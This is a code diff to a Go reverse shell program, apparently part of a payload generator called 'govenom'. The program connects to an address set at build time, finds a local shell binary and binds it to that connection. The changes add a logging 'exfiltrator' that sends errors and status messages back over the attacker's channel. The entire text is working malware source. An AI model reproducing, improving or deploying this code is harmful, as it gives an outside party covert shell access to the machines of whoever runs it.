@@ -2,7 +2,7 @@ package main
 
 import (
 	"fmt"
-	"log"
+	"govenom/debuglog"
 	"net"
 	"os"
 	"os/exec"
@@ -11,7 +11,8 @@ import (
 
 var (
 	// set during compilation/linking via -X ldflag
-	address string
+	address  string
+	debugCfg string
 )
 
 func findShellBinary() (string, error) {
@@ -55,19 +56,27 @@ func attachShell(binaryPath string, con net.Conn) error {
 }
 
 func main() {
+	log, errs := debuglog.New(debugCfg)
+
 	con, err := net.Dial("tcp", address)
 	if err != nil {
-		// TODO: report back through another channel (DNS, ICMP, ...)
-		return
+		log.Printf(err.Error())
 	}
-	log.SetOutput(con)
+
+	log.AddExfiltrator(con)
+	// send out debuglog configuration errors *at least* over TCP
+	if len(errs) > 0 {
+		for _, err := range errs {
+			log.Fatal(err)
+		}
+	}
 
 	binaryPath, err := findShellBinary()
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	log.Printf("Using Shell: %s", binaryPath)
+	log.Printf("Using Shell: %s\n", binaryPath)
 
 	err = attachShell(binaryPath, con)
 	if err != nil {
